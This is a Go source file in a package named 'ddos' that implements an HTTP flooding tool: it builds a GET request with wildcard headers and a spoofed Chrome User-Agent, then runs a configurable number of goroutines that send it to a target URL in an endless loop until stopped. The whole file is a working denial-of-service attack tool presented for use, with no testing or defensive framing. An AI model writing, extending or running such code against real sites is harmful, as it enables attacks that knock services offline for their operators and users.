package ddos

import (
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"runtime"
	"strings"
	"time"
)

func NewFlooder(url string) *flooder {
	return &flooder{
		url: url,
		header: []string{
			"Accept: */*",
			"Accept-Encoding: *",
			"Accept-Language: *",
			"Accept-Charset: *",
		},
		workerAmount: 0,
		client:       http.DefaultClient,
	}
}

type Flooder interface {
	Flood()
}

type flooder struct {
	url          string
	header       []string
	client       *http.Client
	workerAmount uint16
	stopSignal   chan bool
	duration     time.Duration
}

func (f *flooder) Flood(startSignal ...*<-chan bool) {
	defaultRequest := f.configRequest()

	for idx := uint16(0); idx < f.workerAmount; idx++ {
		if startSignal != nil {
			<-(*startSignal[0])
		}

		go f.flood(defaultRequest)
	}

}

func (f flooder) configRequest() *http.Request {
	defaultRequest, err := http.NewRequest(http.MethodGet, f.url, nil)
	if err != nil {
		log.Fatal(err)
	}

	for _, header := range f.header {
		splitedHeader := strings.Split(header, ":")
		defaultRequest.Header.Add(splitedHeader[0], splitedHeader[1])
	}

	defaultRequest.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")
	return defaultRequest
}

func (f *flooder) flood(request *http.Request) {
	for {
		select {
		case <-f.stopSignal:
			return
		default:
			resp, err := f.client.Do(request)
			if err == nil {
				_, _ = io.Copy(ioutil.Discard, resp.Body)
				_ = resp.Body.Close()
			}
		}
		runtime.Gosched()
	}
}

func (f *flooder) Stop() {
	for idx := uint16(0); idx < f.workerAmount; idx++ {
		f.stopSignal <- true
	}
	close(f.stopSignal)
}

func (f *flooder) SetWorkerAmount(workers uint16) {
	f.workerAmount = workers
}

func (f *flooder) SetFloodTime(seconds int32) {
	f.duration = time.Duration(seconds) * time.Second
}
